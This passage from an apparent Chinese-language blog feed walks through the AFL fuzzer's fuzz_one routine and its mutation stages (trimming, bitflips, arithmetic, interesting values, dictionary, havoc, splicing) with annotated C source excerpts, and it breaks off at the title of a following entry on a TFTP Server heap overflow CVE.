c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!queue_cur)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">  queue_cycle++; <span class="comment">//进行fuzz的轮数</span></span><br><span class="line">  current_entry = <span class="number">0</span>; </span><br><span class="line">  cur_skipped_paths = <span class="number">0</span>; </span><br><span class="line">  queue_cur = <span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (seek_to) <span class="comment">//如果是resume,从seek_to指示的位置开始fuzz</span></span><br><span class="line">  {</span><br><span class="line">    current_entry++;</span><br><span class="line">    seek_to--;</span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  show_stats();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (not_on_tty)</span><br><span class="line">  {</span><br><span class="line">    ACTF(<span class="string">"Entering queue cycle %llu."</span>, queue_cycle);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we had a full queue cycle with no new finds, try</span></span><br><span class="line"><span class="comment">     recombination strategies next. */</span></span><br><span class="line">     </span><br><span class="line">  <span class="comment">/*经过上一轮fuzz后,队列中样例数没有变化</span></span><br><span class="line"><span class="comment">    接下来尝试重组策略</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (queued_paths == prev_queued)</span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (use_splicing) <span class="comment">//是否重组输入</span></span><br><span class="line">      cycles_wo_finds++; <span class="comment">//没有新队列样例产生的轮数++</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      use_splicing = <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  prev_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; getenv(<span class="string">"AFL_IMPORT_FIRST"</span>))</span><br><span class="line">    sync_fuzzers(use_argv);<span class="comment">//从其他Fuzzer中获取有趣的测试样例(distributed mode).</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="sync-fuzzers"><a href="#sync-fuzzers" class="headerlink" title="sync_fuzzers"></a>sync_fuzzers</h5><p>从其他Fuzzer的queue中读取测试样例并执行,通过save_if_interesting决定是否导入到自己的queue中.</p><h4 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h4><p>从列表中取出当前条目进行一段时间的模糊测试.成功返回0,跳过或退出返回1.</p><p>在这里插入对common_fuzz_stuff函数的提前分析,该函数会在后续变异fuzz中大量使用.</p><h5 id="common-fuzz-stuff"><a href="#common-fuzz-stuff" class="headerlink" title="common_fuzz_stuff"></a>common_fuzz_stuff</h5><ul><li>如果在setup_post中设置了post_handler,那么这里将先调用post_handler来处理out_buf.用于在写入testcase之前，对写入内容进行封装或者映射。<blockquote><p>afl-fuzz适合基于字节粒度变异的fuzz，但并不是所有目标都可以直接进行字节粒度的fuzz。有些是因为文件解析部分的代码不能单独抽出来，有些是因为文件解析仅仅是逻辑的开始。那么为变异器加层就是在这方面扩展afl-fuzz的最简单方法。<br>一个示例的代码可以参考gitlab/wangxin/afl-wasm/，这是一个可以为WebAssembly的wasm文件变异加层的fuzzer。这个工具产生的样本如下所示，其中变异的部分是wasmCode中的字节码，而外围的JavaScript代码需要手动编写，而且要求外围代码应该尽量复杂。</p></blockquote></li><li>调用write_to_testcase将变异出的数据写入out_file</li><li>调用run_target执行程序,保存返回值到fault.</li><li>接下来处理fault<ul><li>FAULT_TMOUT: <ul><li>如果subseq_tmouts++ &gt; TMOUT_LIMIT<ul><li>cur_skipped_paths++,返回1</li></ul></li><li>否则设置subseq_tmouts = 0</li></ul></li></ul></li><li>如果用户通过SIGUSR1要求丢弃当前输入,cur_skipped_paths++并返回1.</li><li>queued_discovered += save_if_interesting(argv, out_buf, len, fault).</li><li>返回0.</li></ul><h6 id="save-if-interesting"><a href="#save-if-interesting" class="headerlink" title="save_if_interesting"></a>save_if_interesting</h6><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if the result of an execve() during routine fuzzing is interesting,</span></span><br><span class="line"><span class="comment">   save or queue the input test case for further analysis if so. Returns 1 if</span></span><br><span class="line"><span class="comment">   entry is saved, 0 otherwise. */</span></span><br></pre></td></tr></tbody></table></figure><ul><li>如果fault == crash_mode(FAULT_NONE,若指定了-C则为FAULT_CRASH)<ul><li>调用has_new_bits分析执行结果并更新virgin_bits.</li><li>如果本次运行没有导致新的virgin_bits置位<ul><li>如果指定了-C,total_crashes++</li><li>否则返回0</li></ul></li><li>否则调用add_to_queue加入队列.</li><li>如果新的virgin_bits置位的原因是有新的路径产生<ul><li>queue_top-&gt;has_new_cov=1,queued_with_cov++.(queue_top就是刚加入的变异样例)</li></ul></li><li>根据当前trace_bits计算queue_top-&gt;exec_cksum</li><li>调用calibrate_case对当前样例进行校准(calibrate)</li><li>写入到out_dir/queue/id:queued_paths,describe_op(hnb)s文件中</li><li>kepping = 1</li></ul></li><li>根据fault的值进行处理:<ul><li>FAULT_TMOUT:<ul><li>total_tmouts++.</li><li>如果unique_hangs数量&gt;=KEEP_UNIQUE_HANG(500),直接返回keeping.</li><li>如果不在dumb_mode中<ul><li>调用simplify_trace简化trace_bits(为1则该字节对应的路径未发现,为128则该字节对应的路径已发现).</li><li>以virgin_tmout(Bits we haven’t seen in tmouts)作为掩码对简化后的trace_bis进行has_new_bits分析(由于已经简化,此次分析对hit_count不敏感).</li><li>如果没有新bit置位,则直接返回keeping.</li></ul></li><li>unique_tmouts++(到这说明这是一个发现新路径的hang样例)</li><li>在保存该样例到hang目录之前,设置更长的超时时间(EXEC_TIMEOUT)再次执行,确保该样例真正使程序挂起.</li><li>如果二次执行出现了Crash,跳转到keep_as_crash.</li><li>如果第二次执行不再超时,返回keeping.</li><li>否则保存到hangs目录中并记录当前时间作为last_hang_time.</li></ul></li><li>FAULT_CRASH(keep_as_crash)<ul><li>如果unique_crashes数量&gt;=KEEP_UNIQUE_CRASH(5000),直接返回keeping.</li><li>如果不在dumb_mode中<ul><li>调用simplify_trace简化trace_bits(为1则该字节对应的路径未发现,为128则该字节对应的路径已发现).</li><li>以virgin_crash(Bits we haven’t seen in crashes)作为掩码对简化后的trace_bis进行has_new_bits分析(由于已经简化,此次分析对hit_count不敏感).</li><li>如果没有新bit置位,则直接返回keeping.</li></ul></li><li>如果是发现的第一个unique_crash,调用write_crash_readme记录命令行到readme文件中</li><li>保存到crashes目录中并记录当前时间作为last_crash_time.</li></ul></li><li>FAULT_ERROR:<ul><li>抛出异常</li></ul></li><li>default:返回keeping</li></ul></li></ul><h5 id="以一定概率跳过当前样例"><a href="#以一定概率跳过当前样例" class="headerlink" title="以一定概率跳过当前样例"></a>以一定概率跳过当前样例</h5><p><code>!fuzz_one的处理流程从这里开始!</code></p><ul><li>如果队列中有favored且未fuzz过的样例<ul><li>如果当前样例已经fuzz过且不为favored,则有99%的概率被跳过</li></ul></li><li>如果队列中没有favored的样例且队列中样例数&gt;10且不为dumb_mode<ul><li>如果当前样例没有fuzz过且不为第一轮fuzz,有75%的概率被跳过</li><li>否则有95%的概率被跳过</li></ul></li></ul><h5 id="将当前测试样例读入到mmap开辟的origin-in缓冲区中"><a href="#将当前测试样例读入到mmap开辟的origin-in缓冲区中" class="headerlink" title="将当前测试样例读入到mmap开辟的origin_in缓冲区中."></a>将当前测试样例读入到mmap开辟的origin_in缓冲区中.</h5><h5 id="CALIBRATION阶段-仅当早前校准失败"><a href="#CALIBRATION阶段-仅当早前校准失败" class="headerlink" title="CALIBRATION阶段(仅当早前校准失败)"></a>CALIBRATION阶段(仅当早前校准失败)</h5><ul><li>如果当前样例之前校准失败且失败次数小于CAL_CHANCES(3)<ul><li>设置queue_cur-&gt;exec_cksum = 0;并调用calibrate_case进行校准.</li></ul></li></ul><h5 id="TRIMMING阶段"><a href="#TRIMMING阶段" class="headerlink" title="TRIMMING阶段"></a>TRIMMING阶段</h5><p>如果不为dumb_mode且当前样例没有修剪完成,调用trim_case进行修建</p><h6 id="trim-case"><a href="#trim-case" class="headerlink" title="trim_case"></a>trim_case</h6><ul><li>如果样例长度小于5,直接返回</li><li>一些初始化工作<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  stage_name = tmp; <span class="comment">//将stage_name指向tmp缓冲区</span></span><br><span class="line">  bytes_trim_in += q-&gt;len; <span class="comment">//被修剪过的字节数+=q-&gt;len</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Select initial chunk len, starting with large steps. */</span></span><br><span class="line"></span><br><span class="line">  len_p2 = next_p2(q-&gt;len); <span class="comment">//将q-&gt;len向上对齐到2的幂.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置单次修剪长度为len_p2/16,最小为4.</span></span><br><span class="line">  remove_len = MAX(len_p2 / TRIM_START_STEPS, TRIM_MIN_BYTES);</span><br></pre></td></tr></tbody></table></figure></li><li>进入大循环,直到remove_len小于len_p2/1024,每次循环修剪长度会/2.<ul><li>内层循环的初始化工作<ul><li>remove_pos=remove_len. stage_cur = 0;stage_max = q-&gt;len / remove_len;</li></ul></li><li>内层循环,直到remove_pos&gt;=q-&gt;len为止.<ul><li>更新本次课修剪的长度为MIN(remove_len,q-&gt;len-remove_pos)</li><li>调用write_with_gap,跳过从remove_pos开始长度为trim_avail的部分写入out_file</li><li>调用run_target执行一次程序,trim_execs++.</li><li>分析本次执行结果<ul><li>计算cksum,若未发生改变,意味着本次修剪对该样例产生的路径信息无影响<ul><li>保留修剪结果.更新q-&gt;len并重新计算len_p2.</li><li>如果是第一次修剪成功(cksum不改变),保存本次执行的trace_bits至clean_trace用于之后的评分.</li></ul></li><li>否则remove_pos+=remove_len,修剪下一位置.</li></ul></li><li>每执行修剪stats_update_freq次,调用一次show_stats.</li><li>stage_cur++</li></ul></li><li>本轮修剪完成,设置下一轮修剪长度,remove_len &gt;&gt; = 1.</li></ul></li><li>大循环结束,如果有修剪成功的结果,写回原队列文件(之前写入的是out_file).</li><li>将clean_trace拷贝到trace_bits,调用update_bitmap_score对更新后的队列进行评分.</li></ul><h6 id="设置queue-cur-trim-done-1-更新queue-cur-len-拷贝in-buf到out-buf"><a href="#设置queue-cur-trim-done-1-更新queue-cur-len-拷贝in-buf到out-buf" class="headerlink" title="设置queue_cur->trim_done=1,更新queue_cur->len.拷贝in_buf到out_buf"></a>设置queue_cur-&gt;trim_done=1,更新queue_cur-&gt;len.拷贝in_buf到out_buf</h6><h5 id="PERFORMANCE-SCORE阶段"><a href="#PERFORMANCE-SCORE阶段" class="headerlink" title="PERFORMANCE SCORE阶段"></a>PERFORMANCE SCORE阶段</h5><h6 id="calculate-score"><a href="#calculate-score" class="headerlink" title="calculate_score"></a>calculate_score</h6><p>没啥分析的,直接引用一下Sakura师傅.</p><blockquote><p>根据queue entry的执行速度、覆盖到的path数和路径深度来评估出一个得分，这个得分perf_score在后面havoc的时候使用。<br>前面的没什么好说的，这里的q-&gt;depth解释一下，它在每次add_to_queue的时候，会设置为cur_depth+1，而cur_depth是一个全局变量，一开始的初始值为0。<br>    处理输入时<br>        在read_testcases的时候会调用add_to_queue，此时所有的input case的queue depth都会被设置为1。<br>    fuzz_one时<br>        然后在后面fuzz_one的时候，会先设置cur_depth为当前queue的depth，然后这个queue经过mutate之后调用save_if_interesting,如果是interesting case，就会被add_to_queue，此时就建立起了queue之间的关联关系，所以由当前queue变异加入的新queue，深度都在当前queue的基础上再增加。</p></blockquote><h6 id="判断是否需要进行-deterministic-fuzz"><a href="#判断是否需要进行-deterministic-fuzz" class="headerlink" title="判断是否需要进行 deterministic fuzz"></a>判断是否需要进行 deterministic fuzz</h6><p>如果指定了-d选项或者该样例已经进行过fuzz或在早期(恢复)中经过了deterministic fuzz,或者是分布式模式的从fuzzer则直接进入havoc_stage阶段.</p><p>设置 doing_det = 1;</p><h5 id="SIMPLE-BITFLIP-dictionary-construction-阶段"><a href="#SIMPLE-BITFLIP-dictionary-construction-阶段" class="headerlink" title="SIMPLE BITFLIP (+dictionary construction)阶段"></a>SIMPLE BITFLIP (+dictionary construction)阶段</h5><p>这一阶段通过反转样例的比特位进行变异,翻转的宏如下,但看宏不好理解,结合宏调用来理解.<br>_bf取值为[0-len&lt;&lt;3],则每8次循环(_bf&amp;7)将产生[0,1,…8]的移位序列,而^=(128 &gt;&gt; ((_bf)&amp;7))即将一个字节的比特位从高到低依次翻转.<br>_bf&gt;&gt;3将stage_max重新映射回len的长度.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FLIP_BIT(_ar, _b)                   \</span></span><br><span class="line"><span class="meta">  do                                        \</span></span><br><span class="line"><span class="meta">  {                                         \</span></span><br><span class="line"><span class="meta">    u8 *_arf = (u8 *)(_ar);                 \</span></span><br><span class="line"><span class="meta">    u32 _bf = (_b);                         \</span></span><br><span class="line"><span class="meta">    _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf)&amp;7)); \</span></span><br><span class="line"><span class="meta">  } while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面为提取出的宏调用,便于理解宏.</span></span><br><span class="line">stage_max = len &lt;&lt; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++)</span><br><span class="line">    FLIP_BIT(out_buf, stage_cur);</span><br></pre></td></tr></tbody></table></figure><h6 id="maybe-add-auto"><a href="#maybe-add-auto" class="headerlink" title="maybe_add_auto"></a>maybe_add_auto</h6><p>在这里插入对maybe_add_auto函数的提前分析.<br>该函数用来保存关键字到字典.</p><ul><li>跳过连续的相同字节.</li><li>如果该关键字的值是预设的intesting value,直接返回.</li><li>进行大小写不敏感的查找,如果该关键字与预设的关键字重复则直接返回.</li><li>进行大小写不敏感的查找,如果该关键字与此前自动生成的关键字重复则增加其的hit_cnt后进行sort_a_extras.</li><li>否则将其加入a_extras(自动生成的关键字数组).如果已满则替换掉下标为 MAX_AUTO_EXTRAS / 2 +UR((MAX_AUTO_EXTRAS + 1) / 2)的关键字.</li><li>sort_a_extras:<ul><li>先将a_extras按照hit_cnt进行递减排序(保证发生替换时被替换的关键字hit_count较小).</li><li>再按len对前USE_AUTO_EXTRAS(50)个关键字进行递增排序.</li></ul></li></ul><h6 id="bitflip-1-1"><a href="#bitflip-1-1" class="headerlink" title="bitflip 1/1"></a>bitflip 1/1</h6><p><code>SIMPLE BITFLIP (+dictionary construction)阶段从这里开始!</code><br>bitflip 1/1会额外进行字典的构建.假设关键字具有这样的特性:当某关键字中的任意一个字节(最低有效位)发生改变,会使得程序走向与原输入不同的路径,且任意字节的改变都导致走向相同的路径.</p><ul><li>设置prev_cksum=queue_cur-&gt;exec_cksum</li><li>循环stage_max(len&lt;&lt;3)次,即遍历样例中的每一个比特位<ul><li>将该比特位翻转后调用一次common_fuzz_stuff(详见前文分析).再翻转回来.</li><li>如果不在dumb_mode,则尝试收集关键字.<ul><li>每当翻转一个字节的最低有效位时,进行特殊处理<ul><li>如果cksum!=prev_cksum,说明可能进入了一个关键字或离开了一个关键字,若a_len在规定的关键字长度限制之内,调用maybe_add_auto尝试保存当前a_collect中的关键字,更新a_len=0,prev_cksum=cksum.</li><li>如果ck_sum!=queue-&gt;exec_cksum,则在MAX_AUTO_EXTRA的长度限制内保存当前字节到a_collect.a_len++.</li><li>如果是最后一次循环,直接调用maybe_add_auto尝试保存当前a_collect中的关键字.</li></ul></li></ul></li><li>更新一些记录<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_FLIP1] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP1] += stage_max;</span><br></pre></td></tr></tbody></table></figure></li></ul></li></ul><h6 id="bitflip-2-1"><a href="#bitflip-2-1" class="headerlink" title="bitflip 2/1"></a>bitflip 2/1</h6><p>和bitflip 1/1类似,一次翻转2位.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">    <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">  FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h6 id="bitflip-4-1"><a href="#bitflip-4-1" class="headerlink" title="bitflip 4/1"></a>bitflip 4/1</h6><p>和bitflip 1/1类似,一次翻转4位.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = stage_cur &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">2</span>);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">    <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">  FLIP_BIT(out_buf, stage_cur);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">2</span>);</span><br><span class="line">  FLIP_BIT(out_buf, stage_cur + <span class="number">3</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h6 id="bitflip-8-8"><a href="#bitflip-8-8" class="headerlink" title="bitflip 8/8"></a>bitflip 8/8</h6><p>和bitflip 1/1类似,一次翻转1字节.<br>在这一过程中会同时完成effector map的构造,具体来说,如果一个将一个字节翻转后路径信息发生改变,将effector map中对应的位置置1,表示有效,否则置0,表示无效.在之后开销更大的阶段将会跳过这些无效字节.</p><p>如果最后有效字节的密度大于90%,则将map全部标记为有效,因为跳过并不会节约太多时间.</p><h6 id="bitflip-16-8"><a href="#bitflip-16-8" class="headerlink" title="bitflip 16/8"></a>bitflip 16/8</h6><p>和bitflip 1/1类似,一次翻转2字节,但跳过effector map中两个连续的无效字节.</p><h6 id="bitflip-32-8"><a href="#bitflip-32-8" class="headerlink" title="bitflip 32/8"></a>bitflip 32/8</h6><p>和bitflip 1/1类似,一次翻转4字节,但跳过effector map中四个连续的无效字节.</p><h5 id="ARITHMETIC-INC-DEC阶段"><a href="#ARITHMETIC-INC-DEC阶段" class="headerlink" title="ARITHMETIC INC/DEC阶段"></a>ARITHMETIC INC/DEC阶段</h5><h6 id="arith-8-8"><a href="#arith-8-8" class="headerlink" title="arith 8/8"></a>arith 8/8</h6><p>对每一个byte,分别加上及减去从0到ARITH_MAX(35)的整数后进行common_fuzz_stuff.其中会跳过effector map中指示无效的和之前已经由bitflip阶段产生过的输入.</p><p>判断是否产生过是通过could_be_bitflip函数,方法是将原数据异或上运算后的数据得到结果val,将其右移直到最低有效位为1(即原数据与运算后数据不同的第一个比特位).此时根据val中连续为1的比特位位数是否对应翻转阶段的步长(1,2,4,8,….)来判断此数据是否已经产生过.</p><h6 id="arith-16-8"><a href="#arith-16-8" class="headerlink" title="arith 16/8"></a>arith 16/8</h6><p>对每一个word,分大端序和小端序两种情况,均分别加上及减去从0到ARITH_MAX(35)的整数后进行common_fuzz_stuff.其中会跳过effector map中指示无效的和之前已经由bitflip阶段产生过的输入以及加减后仅影响最低1字节的(此情况已在arith 8/8中处理).</p><h6 id="arith-32-8"><a href="#arith-32-8" class="headerlink" title="arith 32/8"></a>arith 32/8</h6><p>对每一个dword,分大端序和小端序两种情况,均分别加上及减去从0到ARITH_MAX(35)的整数后进行common_fuzz_stuff.其中会跳过effector map中指示无效的和之前已经由bitflip阶段产生过的输入以及加减后仅影响最低2字节的(此情况已在arith 16/8中处理).</p><h5 id="INTERESTING-VALUES阶段"><a href="#INTERESTING-VALUES阶段" class="headerlink" title="INTERESTING VALUES阶段"></a>INTERESTING VALUES阶段</h5><h6 id="interest-8-8"><a href="#interest-8-8" class="headerlink" title="interest 8/8"></a>interest 8/8</h6><p>以byte为单位将原数据替换为interest.跳过之前阶段中产生过的数据.</p><p>interest是一些特殊的数据</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_8 \</span></span><br><span class="line"><span class="meta">  -128,          <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span></span><br><span class="line"><span class="meta">  -1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   0,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   16,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   64,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   100,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   127           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h6 id="interest-16-8"><a href="#interest-16-8" class="headerlink" title="interest 16/8"></a>interest 16/8</h6><p>以word为单位将原数据替换为interest.跳过之前阶段中产生过的数据.</p><h6 id="interest-32-8"><a href="#interest-32-8" class="headerlink" title="interest 32/8"></a>interest 32/8</h6><p>以dword为单位将原数据替换为interest.跳过之前阶段中产生过的数据.</p><h5 id="DICTIONARY-STUFF阶段"><a href="#DICTIONARY-STUFF阶段" class="headerlink" title="DICTIONARY STUFF阶段"></a>DICTIONARY STUFF阶段</h5><h6 id="user-extras-over"><a href="#user-extras-over" class="headerlink" title="user extras (over)"></a>user extras (over)</h6><ul><li>遍历原输入中的每一个字节作为起始替换点<ul><li>遍历所有预设关键字<ul><li>如果下列条件满足其一 1)当前替换点没有足够空间进行替换 2)当前将要被替换的数据与当前关键字重复 3)将要被替换的数据在effector map中标记为无效 4 )extras_cnt &gt; MAX_DET_EXTRAS &amp;&amp; UR(extras_cnt) &gt;= MAX_DET_EXTRAS)<ul><li>跳过本次替换.</li></ul></li><li>否则进行替换并进行common_fuzz_stuff</li></ul></li></ul></li></ul><h6 id="user-extras-insert"><a href="#user-extras-insert" class="headerlink" title="user extras (insert)"></a>user extras (insert)</h6><ul><li>遍历原输入中每一个字节作为插入点<ul><li>遍历所有预设关键字<ul><li>如果插入后长度不超过MAX_FILE<ul><li>插入并调用common_fuzz_stuff</li></ul></li></ul></li></ul></li></ul><h6 id="auto-extras-over"><a href="#auto-extras-over" class="headerlink" title="auto extras (over)"></a>auto extras (over)</h6><ul><li>遍历原输入中的每一个字节作为起始替换点<ul><li>遍历所有自动生成的关键字<ul><li>如果下列条件满足其一 1)当前替换点没有足够空间进行替换 2)当前将要被替换的数据与当前关键字重复 3)将要被替换的数据在effector map中标记为无效 <ul><li>跳过本次替换.</li></ul></li><li>否则进行替换并进行common_fuzz_stuff</li></ul></li></ul></li></ul><h5 id="RANDOM-HAVOC阶段"><a href="#RANDOM-HAVOC阶段" class="headerlink" title="RANDOM HAVOC阶段"></a>RANDOM HAVOC阶段</h5><p>这里直接引用Sakura师傅的文章.<br>   havoc，顾名思义，是充满了各种随机生成的变异，是对原文件的“大破坏”。具体来说，havoc包含了对原文件的多轮变异，每一轮都是将多种方式组合（stacked）而成：</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul><h5 id="SPLICING阶段"><a href="#SPLICING阶段" class="headerlink" title="SPLICING阶段"></a>SPLICING阶段</h5><ul><li>如果use_splicing=1<ul><li>尝试拼接两个测试样例中的内容，拼接之后重新走一遍RANDOM HAVOC阶段</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 模糊测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-10387 TFTP Server 堆溢出</title>
      <link href="/2024/CVE-2018-10387%20TFTP%20Server-HeapOverflow/"/>
      <url>/2024/CVE-2018-10387%20TFTP%20Server-HeapOverflow/</url>
      
